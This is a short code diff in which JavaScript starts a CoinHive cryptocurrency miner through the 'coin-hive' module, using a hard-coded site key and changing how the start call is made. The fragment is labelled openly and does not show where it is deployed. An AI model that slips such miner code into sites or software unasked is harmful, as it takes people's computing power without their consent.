@@ -27,7 +27,7 @@ var CoinHive = require('coin-hive');
 //(async () => {
   // Create miner
 
-  CoinHive.start('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq').then(function(err,start){
+  CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,start){
     if(err){
         is_hive_start=err;
       }else{
